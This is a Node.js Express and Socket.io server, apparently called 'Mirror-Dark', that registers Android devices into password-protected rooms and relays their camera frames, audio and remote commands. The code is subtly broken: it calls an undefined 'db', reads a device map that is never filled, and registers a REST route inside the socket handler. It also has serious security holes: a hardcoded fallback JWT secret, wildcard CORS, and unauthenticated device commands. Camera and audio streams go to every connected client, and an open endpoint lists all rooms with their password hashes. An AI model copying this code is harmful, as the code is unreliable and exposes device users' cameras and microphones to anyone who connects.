const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const cors = require('cors');
const pool = require('./db');

const app = express();
app.use(express.json());
app.use(cors());

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

const JWT_SECRET = process.env.JWT_SECRET || 'clave_secreta_super_segura_mirror_dark';

// ----------------------------------------------------
// INICIALIZACIÓN DE TABLAS EN MYSQL (Automática al arrancar)
// ----------------------------------------------------
async function initDB() {
    try {
        await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        name VARCHAR(100) NOT NULL,
        username VARCHAR(50) UNIQUE NOT NULL,
        correo VARCHAR(100) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

        await pool.query(`
      CREATE TABLE IF NOT EXISTS rooms (
        id INT AUTO_INCREMENT PRIMARY KEY,
        nombre VARCHAR(100) NOT NULL,
        codigo VARCHAR(10) UNIQUE NOT NULL,
        contrasena VARCHAR(255) NOT NULL,
        owner_id INT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (owner_id) REFERENCES users(id) ON DELETE CASCADE
      )
    `);

        await pool.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id INT AUTO_INCREMENT PRIMARY KEY,
        device_uid VARCHAR(100) UNIQUE NOT NULL,
        nombre VARCHAR(100) NOT NULL,
        room_id INT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (room_id) REFERENCES rooms(id) ON DELETE CASCADE
      )
    `);
        console.log('[Database] Tablas verificadas/creadas correctamente en MySQL.');
    } catch (err) {
        console.error('[Database Error] Error al inicializar tablas:', err);
    }
}
initDB();

// ----------------------------------------------------
// RUTAS REST: AUTENTICACIÓN Y GESTIÓN DE SALAS
// ----------------------------------------------------

// Registrar Usuario
app.post('/api/auth/register', async (req, res) => {
    try {
        const { name, username, correo, password } = req.body;
        const hashedPassword = await bcrypt.hash(password, 10);

        await pool.query(
            'INSERT INTO users (name, username, correo, password) VALUES (?, ?, ?, ?)',
            [name, username, correo, hashedPassword]
        );

        res.status(201).json({ success: true, message: "Usuario registrado con éxito" });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Login de Usuario (JWT)
app.post('/api/auth/login', async (req, res) => {
    try {
        const { correo, password } = req.body;
        const [rows] = await pool.query('SELECT * FROM users WHERE correo = ?', [correo]);

        if (rows.length === 0) {
            return res.status(401).json({ success: false, message: "Credenciales inválidas" });
        }

        const user = rows[0];
        const match = await bcrypt.compare(password, user.password);
        if (!match) {
            return res.status(401).json({ success: false, message: "Credenciales inválidas" });
        }

        const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '12h' });
        res.json({ success: true, token, user: { id: user.id, name: user.name, username: user.username, correo: user.correo } });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Crear Sala
app.post('/api/rooms/create', async (req, res) => {
    try {
        const { nombre, codigo, contrasena, owner_id } = req.body;
        const hashedRoomPass = await bcrypt.hash(contrasena, 10);

        await pool.query(
            'INSERT INTO rooms (nombre, codigo, contrasena, owner_id) VALUES (?, ?, ?, ?)',
            [nombre, codigo, hashedRoomPass, owner_id]
        );

        res.status(201).json({ success: true, message: "Sala creada con éxito" });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ----------------------------------------------------
// WEBSOCKETS (PANEL Y DISPOSITIVOS MÓVILES)
// ----------------------------------------------------

let connectedDevices = new Map();

io.on('connection', (socket) => {
    console.log(`[+] Conexión establecida: ${socket.id}`);

    // 1. Autenticación del panel web por JWT
    socket.on('authenticate_panel', (token) => {
        try {
            const decoded = jwt.verify(token, JWT_SECRET);
            socket.user = decoded;
            socket.emit('auth_success', { message: "Panel autenticado" });
            console.log(`[🔐] Panel autenticado para usuario ID: ${decoded.id}`);
        } catch (err) {
            socket.emit('auth_error', { message: "Token inválido" });
            socket.disconnect();
        }
    });

    // 2. Registro del dispositivo móvil validando la Sala (Código y Contraseña)
    // Ejemplo de cómo debe lucir el manejador en tu servidor Node.js
    socket.on('register_device_to_room', async (data) => {
        try {
            const { deviceUid, name, roomCode, roomPassword, battery } = data;

            // 1. Buscar la sala en tu base de datos MySQL (tabla rooms)
            const room = await db.query('SELECT * FROM rooms WHERE codigo = ?', [roomCode]);

            if (!room || room.length === 0) {
                socket.emit('room_auth_error', { message: 'La sala no existe' });
                return;
            }

            // 2. Validar contraseña con bcrypt
            const isValidPassword = await bcrypt.compare(roomPassword, room[0].contrasena);
            if (!isValidPassword) {
                socket.emit('room_auth_error', { message: 'Contraseña incorrecta' });
                return;
            }

            // 3. Unir el socket a la sala de Socket.io
            socket.join(roomCode);

            // 4. Guardar el dispositivo en la sesión activa de la sala (en memoria o estructura del servidor)
            // Por ejemplo, asociando el socket.id con los datos del teléfono
            global.activeDevices = global.activeDevices || {};
            global.activeDevices[socket.id] = {
                socketId: socket.id,
                deviceUid,
                name: name || 'Android Device',
                roomCode,
                battery: battery || 100
            };

            // 5. ¡LO MÁS IMPORTANTE!: Notificar al panel web de esta sala que hay un nuevo nodo activo
            const devicesInRoom = Object.values(global.activeDevices).filter(d => d.roomCode === roomCode);

            // El servidor web escucha este evento para pintar las tarjetas en pantalla
            io.to(roomCode).emit('update_devices', devicesInRoom);

            console.log(`Dispositivo ${name} aceptado en la sala ${roomCode}`);

        } catch (error) {
            console.error('Error en registro de dispositivo:', error);
        }
    });

    // 3. Comandos y Streams
    socket.on('send_command_to_device', (data) => {
        const { targetId, action, ...extra } = data;
        io.to(targetId).emit('command_to_phone', { action, ...extra });
    });

    socket.on('camera_frame', (base64Frame) => {
        io.emit('camera_frame', { deviceId: socket.id, frame: base64Frame });
    });

    socket.on('audio_chunk', (base64Audio) => {
        io.emit('audio_chunk', { deviceId: socket.id, chunk: base64Audio });
    });

    socket.on('client_audio_chunk', (data) => {
        const { targetId, chunk } = data;
        io.to(targetId).emit('play_audio_chunk', { chunk });
    });

    socket.on('disconnect', () => {
        if (connectedDevices.has(socket.id)) {
            const dev = connectedDevices.get(socket.id);
            connectedDevices.delete(socket.id);
            io.to(`room_${dev.roomCode}`).emit('update_devices', Array.from(connectedDevices.values()).filter(d => d.roomCode === dev.roomCode));
        }
    });

    // Obtener salas del usuario autenticado
    app.get('/api/rooms', async (req, res) => {
        try {
            // Opcional: puedes filtrar por owner_id si pasas el token, 
            // o traer todas las salas para que el usuario las vea.
            const [rooms] = await pool.query('SELECT * FROM rooms');
            res.json({ success: true, rooms });
        } catch (error) {
            res.status(500).json({ success: false, error: error.message });
        }
    });
});

// Railway asigna el puerto mediante process.env.PORT automáticamente
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor Mirror-Dark corriendo en puerto ${PORT}`);
});